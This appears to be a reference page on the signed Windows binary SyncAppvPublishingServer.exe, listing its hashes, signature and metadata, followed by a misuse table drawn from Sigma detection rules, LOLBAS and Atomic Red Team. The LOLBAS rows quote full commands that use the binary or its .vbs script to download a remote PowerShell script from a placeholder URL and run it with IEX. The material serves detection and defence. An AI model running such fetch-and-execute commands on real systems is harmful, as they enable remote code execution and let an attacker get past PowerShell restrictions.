---
title: SyncAppvPublishingServer.exe | Microsoft Application Virtualization Sync Utility
excerpt: What is SyncAppvPublishingServer.exe?
---

# SyncAppvPublishingServer.exe 

* File Path: `C:\WINDOWS\system32\SyncAppvPublishingServer.exe`
* Description: Microsoft Application Virtualization Sync Utility

## Hashes

Type | Hash
-- | --
MD5 | `52E0676397575A4D3854856469594B6C`
SHA1 | `5D9FCEEB1E76BFD4AC4FA37388060BA1241CF1C2`
SHA256 | `54445D511D9C53749410FCA4457A31459422020254CBF19D8FE23BAE4955DA0D`
SHA384 | `E246A861D1C51F241C308E254A713C71E7D88025BC52A21BF65D344104DF420EA1D8A591923851B5A8556CA59AE717AD`
SHA512 | `3F214E48086CFF77C032C8C74EFA8DF6D36CB9E35312977A27E1FE63837BBFAC2BC488C8D37F8B9626B79D6A53C7BD75F77F3CC33452E8A06CEE99C12C3017A2`
SSDEEP | `768:JsYT/QSJpwOQtWf3zvKBx+cCgMngU0Sor5vv1EY0961wqnOGhj3M1PErbs:Jr/pRgMzi7QnvolvNx0961wAsPEfs`
IMP | `F257653306F459B41C68AF82790A4465`
PESHA1 | `181457D0E8AB3DB26EFC592F201465C1CE0E8B72`
PE256 | `0A573722371A109CEFE66A9CEF2217C444D3658ABCD19FA17B482A293191B7AC`

## Runtime Data

### Loaded Modules:

Path |
-- |
C:\WINDOWS\System32\KERNEL32.DLL |
C:\WINDOWS\System32\KERNELBASE.dll |
C:\WINDOWS\SYSTEM32\ntdll.dll |
C:\WINDOWS\system32\SyncAppvPublishingServer.exe |


## Signature

* Status: Signature verified.
* Serial: `33000002ED2C45E4C145CF48440000000002ED`
* Thumbprint: `312860D2047EB81F8F58C29FF19ECDB4C634CF6A`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: syncappvpublishingserver.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.22000.282 (WinBuild.160101.0800)
* Product Version: 10.0.22000.282
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/72
* VirusTotal Link: https://www.virustotal.com/gui/file/54445d511d9c53749410fca4457a31459422020254cbf19d8fe23bae4955da0d/detection


## Possible Misuse

*The following table contains possible examples of `SyncAppvPublishingServer.exe` being misused. While `SyncAppvPublishingServer.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/powershell_syncappvpublishingserver_exe.yml) | `title: SyncAppvPublishingServer Execution to Bypass Powershell Restriction`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/powershell_syncappvpublishingserver_exe.yml) | `description: Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/powershell_syncappvpublishingserver_exe.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/powershell_syncappvpublishingserver_exe.yml) | `- 'SyncAppvPublishingServer.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/process_creation_syncappvpublishingserver_exe.yml) | `title: SyncAppvPublishingServer Execution to Bypass Powershell Restriction`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/process_creation_syncappvpublishingserver_exe.yml) | `description: Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/process_creation_syncappvpublishingserver_exe.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/process_creation_syncappvpublishingserver_exe.yml) | `Image\|endswith: '\SyncAppvPublishingServer.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_in_memory_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_in_memory_powershell.yml) | `- '\syncappvpublishingserver.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_contextinfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_module/powershell_syncappvpublishingserver_exe_in_contextinfo.yml) | `title: SyncAppvPublishingServer Execution to Bypass Powershell Restriction`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_contextinfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_module/powershell_syncappvpublishingserver_exe_in_contextinfo.yml) | `description: Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_contextinfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_module/powershell_syncappvpublishingserver_exe_in_contextinfo.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_contextinfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_module/powershell_syncappvpublishingserver_exe_in_contextinfo.yml) | `ContextInfo\|contains: 'SyncAppvPublishingServer.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_script/powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml) | `title: SyncAppvPublishingServer Execution to Bypass Powershell Restriction`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_script/powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml) | `description: Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_script/powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_script/powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml) | `ScriptBlockText\|contains: 'SyncAppvPublishingServer.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml) | `title: SyncAppvPublishingServer Execute Arbitrary PowerShell Code`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml) | `description: Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml) | `Image\|endswith: '\SyncAppvPublishingServer.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_vbs_execute_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_vbs_execute_powershell.yml) | `title: SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_vbs_execute_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_vbs_execute_powershell.yml) | `description: Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_vbs_execute_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_vbs_execute_powershell.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_vbs_execute_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_vbs_execute_powershell.yml) | `- '\SyncAppvPublishingServer.vbs'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `Name: SyncAppvPublishingServer.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `- Command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') \| IEX"`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `Usecase: Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `- Path: C:\Windows\System32\SyncAppvPublishingServer.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `- Path: C:\Windows\SysWOW64\SyncAppvPublishingServer.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `- IOC: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `Name: Syncappvpublishingserver.vbs`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `- Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') \| IEX"`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `- Path: C:\Windows\System32\SyncAppvPublishingServer.vbs`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #2: SyncAppvPublishingServer - Execute arbitrary PowerShell code [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #1: SyncAppvPublishingServer Signed Script PowerShell Command Execution [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #2: SyncAppvPublishingServer - Execute arbitrary PowerShell code [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #1: SyncAppvPublishingServer Signed Script PowerShell Command Execution [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | - [Atomic Test #1 - SyncAppvPublishingServer Signed Script PowerShell Command Execution](#atomic-test-1---syncappvpublishingserver-signed-script-powershell-command-execution) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | ## Atomic Test #1 - SyncAppvPublishingServer Signed Script PowerShell Command Execution | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | - [Atomic Test #2 - SyncAppvPublishingServer - Execute arbitrary PowerShell code](#atomic-test-2---syncappvpublishingserver---execute-arbitrary-powershell-code) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | ## Atomic Test #2 - SyncAppvPublishingServer - Execute arbitrary PowerShell code | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe. Requires Windows 10. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | SyncAppvPublishingServer.exe "n; #{powershell_code}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


